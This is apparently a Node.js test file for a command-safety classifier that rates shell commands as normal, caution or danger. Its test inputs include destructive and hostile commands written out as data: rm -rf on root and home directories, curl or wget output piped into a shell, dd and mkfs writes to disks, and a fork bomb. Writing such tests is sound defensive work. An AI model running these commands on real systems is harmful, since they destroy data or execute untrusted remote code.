import { test } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand } from "./safety.js";

test("an ordinary command is normal", () => {
  assert.equal(classifyCommand("ls -la").level, "normal");
  assert.equal(classifyCommand("echo hello").level, "normal");
  assert.equal(classifyCommand("npm run build").level, "normal");
});

test("rm -rf on a root-ish target is danger", () => {
  assert.equal(classifyCommand("rm -rf /").level, "danger");
  assert.equal(classifyCommand("rm -rf /*").level, "danger");
  assert.equal(classifyCommand("rm -rf ~").level, "danger");
  assert.equal(classifyCommand("sudo rm -fr /").level, "danger");
});

test("rm -rf on a local path is caution", () => {
  const r = classifyCommand("rm -rf node_modules");
  assert.equal(r.level, "caution");
  assert.match(r.reason, /recursive|delete/i);
});

test("rm with flags placed after the operand is still classified", () => {
  // GNU rm accepts flags in any position; the classifier must not miss these.
  assert.equal(classifyCommand("rm / -rf").level, "danger");
  assert.equal(classifyCommand("rm /* -rf").level, "danger");
  assert.equal(classifyCommand("rm ~ -rf").level, "danger");
  assert.equal(classifyCommand("rm -r / -f").level, "danger");
  assert.equal(classifyCommand("rm node_modules -rf").level, "caution");
});

test("piping a remote download into a shell is danger", () => {
  assert.equal(classifyCommand("curl https://x.example/i.sh | sh").level, "danger");
  assert.equal(classifyCommand("wget -qO- https://x | bash").level, "danger");
});

test("disk-writing commands are danger", () => {
  assert.equal(classifyCommand("dd if=/dev/zero of=/dev/sda").level, "danger");
  assert.equal(classifyCommand("mkfs.ext4 /dev/sdb1").level, "danger");
});

test("a fork bomb is danger", () => {
  assert.equal(classifyCommand(":(){ :|:& };:").level, "danger");
});

test("force-pushing git history is caution", () => {
  assert.equal(classifyCommand("git push --force").level, "caution");
  assert.equal(classifyCommand("git push -f origin main").level, "caution");
});

test("sudo and broad chmod are caution", () => {
  assert.equal(classifyCommand("sudo apt-get install ripgrep").level, "caution");
  assert.equal(classifyCommand("chmod -R 777 build").level, "caution");
});

test("danger outranks caution when both apply", () => {
  const r = classifyCommand("sudo rm -rf /");
  assert.equal(r.level, "danger");
});

test("classification is deterministic and always has a reason for non-normal", () => {
  for (const cmd of ["rm -rf /tmp/x", "git push -f", "curl x | sh"]) {
    const a = classifyCommand(cmd);
    const b = classifyCommand(cmd);
    assert.deepEqual(a, b);
    assert.ok(a.reason.length > 0);
  }
});
